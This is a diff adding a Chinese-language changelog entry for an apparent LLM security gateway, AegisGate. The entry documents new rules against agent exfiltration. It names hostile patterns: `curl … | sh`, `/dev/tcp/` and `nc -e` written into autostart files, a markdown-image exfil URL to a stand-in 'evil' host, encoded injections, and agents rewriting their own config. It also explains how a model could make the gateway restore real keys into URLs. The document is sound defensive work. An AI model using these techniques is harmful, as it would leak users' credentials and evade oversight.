@@ -109,6 +109,71 @@ each. Collapsing those into dated releases is tracked in [ROADMAP.md](ROADMAP.md
   - `MAX_ACTION_MAP_RISK_SCORE` 的钉子改为读整个实参表达式：原先的 `([0-9.]+)` 正则对三元
     （`0.58 if … else 0.85`）完全不匹配，那两支是没被钉住的；配置驱动的分值（如 `self._request_risk_floor`）
     可以从 YAML 抬过常量——正是这个检查要防的静默漂移，现在会直接失败。
+### Added（外泄链路加固 S3：三项独立增量 + 还原侧的位置判据）
+
+四条互不依赖，各自可单独回退。
+
+- **A1 · 解码结果回流。** 多级解码（base64 / hex / URL）出来的文本此前只匹配 `decoded_keywords`
+  那九条关键词，于是把一条注入用 base64 包一层，就能从刚刚扫过外层文本的**每一个**规则族旁边走过去。
+  现在重跑 `direct_patterns` / `system_exfil_patterns` / `tool_call_injection_patterns` 三个指令族，
+  命中记为 `decoded:<规则 ID>`，落进它作为明文时会落进的同一个信号桶——编码过的指令按它本来的分量计。
+  - `html_markdown` / `remote_content` / `spam_noise` 刻意不回流：它们描述文本**怎么写**，解码之后
+    说明不了什么。
+  - 另记一条 `obfuscated:encoded_payload_command`。「有编码载荷」和「载荷里带指令」是两件事，且
+    `obfuscated` 与上述三族分属不同权重桶，不构成重复计分。
+
+- **A2 · 持久化规则（3 条，`tool_call_guard.dangerous_param_patterns`）。** 判定「自启动面 + 拉取远程
+  代码并执行」同时成立：`crontab` / `/etc/cron.*` / `/etc/systemd/system` / `~/.config/systemd/user` /
+  LaunchAgents / LaunchDaemons / `HKCU\...\CurrentVersion\Run` / 启动目录 / `.bashrc` / `.zshrc` /
+  `.profile`，配上 `curl … | sh`、`/dev/tcp/`、`Invoke-Expression`、`nc -e` 之类的载荷。
+  - **单侧一律不判**：写 `.bashrc` 是日常配置，装个 cron 是日常部署。
+  - 第三条针对 agent 改写自身配置（MCP server 定义、`settings.json`、`CLAUDE.md`、skill 文件、
+    `.mcp.json`、`.codex/config.toml`）后接网络命令。
+  - 这三条不在 `_PATH_REFERENCE_PATTERN_IDS` 里，因此**对写文件类工具同样生效**——攻击本身就是那次写入。
+
+- **A3 · markdown 图片外带（1 条正则，登记两处）。** `![](https://evil/?d=KEY)` 渲染即发出请求，不需要
+  点击；而既有的 `html_markdown_patterns` 只有 `<img` 标签，没有 markdown 图片语法。
+  - 规则**要求 query 里带密钥形态或 AegisGate 占位符**，所以既有的「`<img>` 是代码示例里的正常 HTML，
+    不遮挡」这个取舍可以原样保留。
+  - `injection_detector.html_markdown_patterns`：该类别在 `action_map` 里刻意无条目，因此只计分。
+  - `sanitizer.unsafe_markup_patterns`：**执行点**。`OutputSanitizer` 是响应侧最后一个过滤器，跑在
+    `RestorationFilter` 之后，看到的是占位符背后的真实凭据——让那条 URL 走到渲染器就是外泄本身。
+
+- **还原侧的位置判据（3 条）。** `RestorationFilter` 的 exfil 门是「占位符出现 **且** 措辞可疑」；措辞类
+  正则可以改写，不命中就**无条件把占位符还原成真实值写回正文**。也就是说，模型只要把占位符塞进 URL
+  而不带任何可疑措辞，网关会主动把真实密钥写回去。
+  - 新增的三条按**位置**判定：占位符出现在 URL query 值、网络命令的参数位、markdown 图片 URL 里。
+    这些位置正是数据离开本机的地方，换个说法绕不过去。
+  - 测试用的三条语料里没有任何可疑措辞，位置就是全部信号。
+
+- 规则组数不变（仍 31 组），条数 172 → 180；`security_filters.yaml` 实际 32 组 / 228 → 236 条。
+- 新增 `aegisgate/tests/test_exfil_increments.py`（43 条）：12 条攻击语料必须命中，17 条日常开发语料
+  必须一条都不命中；每条新正则另过 `regex_probe` 沙箱与 `test_redos_guard` 的静态预算。
+
+- **评审修复（同一阶段内）**：
+  - **A1 的解码回流不再重跑「序列化格式」类规则**（`mcp_tools_call`、`gemini_function_call`、
+    `bedrock_tool_use`、`tool_uses_json` 等 10 条）。`tool_call_injection` 在 `action_map` 里是 `block`，
+    而 `injection_detector._apply_action` 对 `block` **直接设 disposition、不看阈值**；那几条描述的是真实
+    agent 协议的报文格式，而「把一帧 JSON base64 后贴进 prompt」正是调 MCP 的人天天做的事。回流它们等于
+    把日常的 agent 开发流量变成硬阻断，且载荷不透明、用户看不到原因。划的是这个家族已有的那条线——
+    描述「文本怎么写」的规则解码之后说明不了什么，序列化格式就是「怎么写」；描述**冒充**的
+    （`<invoke name=`、`Action:`/`Action Input:`、`functions.exec`）照旧回流。
+  - **A2 的两半必须由数据流连接，不能只是「同一行相邻」**：中间跨度改为不能跨 `&&`。
+    `echo 'alias ll=...' >> ~/.bashrc && curl -fsSL https://get.docker.com | sh` 是两件普通的安装步骤，
+    `&&` 不把数据交给第二条命令——与 `exfil_chain` 里 `cat .env | curl` 和 `source .env && curl` 的分界同一条理由。
+  - **还原侧的位置判据只对凭据形态的占位符标签生效**（`KEY`/`TOKEN`/`SECRET`/`JWT`/`COOKIE`/… ），
+    不再是所有占位符。命中不是「不还原」而是**整条响应被拦**，而 PII 占位符在正常工作里就会出现在这些位置：
+    用户贴 `https://admin.example.com/users?email=…`，脱敏把地址换成占位符，模型把 URL 回显——把用户自己的
+    邮箱还原回去是往返正常工作，不是外泄。同样位置上的凭据才是。
+  - 语料补 11 条（攻击 14 / 日常 28）：`&&` 相邻的安装一行、以及 `EMAIL`/`PHONE`/`SYS_USERNAME`/`NAME_FIELD`
+    四类 PII 占位符出现在 URL、网络命令参数与 markdown 图片里，全部不得命中。
+
+  - 与 S0 合并后的口径：规则组数仍 31 组，条数 172 → **193**（S0 +13、S3 +8）；`security_filters.yaml`
+    实际 32 组 / 228 → **249** 条。两个分支各自从 172 起算，任何「取一侧」的解冲突都会让
+    `test_rule_group_and_rule_counts_match_docs` 直接红。
+  - **`sanitizer.unsafe_markup_patterns` 补上 S1 的 evidence 记录点**。A3 的执行点在这一组，而 S1 只在
+    `command_patterns` 与 `tool_call_guard` 上记录——审计块会一直报 `chain` 而系统性地缺 `egress`，
+    而维度拆分正是这条记录存在的理由：照它做校准会得出「出口侧从不命中」的结论。
 
 
 ### Changed（行为变更：安全级别三档恢复为三档）
